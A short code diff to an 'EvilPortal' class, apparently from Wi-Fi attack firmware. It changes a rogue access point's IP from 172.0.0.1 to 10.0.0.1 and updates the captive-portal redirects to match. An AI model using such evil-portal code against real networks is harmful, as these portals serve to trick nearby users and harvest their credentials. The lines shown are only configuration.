@@ -100,7 +100,7 @@ void EvilPortal::setupServer() {
   // as captive. Windows NCSI's body-check already worked; this fixes the rest.
   for (int i = 0; i < sizeof(captiveEndpoints) / sizeof(captiveEndpoints[0]); i++) {
     server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
-      request->redirect("http://172.0.0.1/");
+      request->redirect("http://10.0.0.1/");
     });
   }
 
@@ -316,7 +316,7 @@ bool EvilPortal::setAP(String essid) {
 }
 
 void EvilPortal::startAP() {
-  const IPAddress AP_IP(172, 0, 0, 1);
+  const IPAddress AP_IP(10, 0, 0, 1);
 
   WiFi.mode(WIFI_AP);
   WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0));
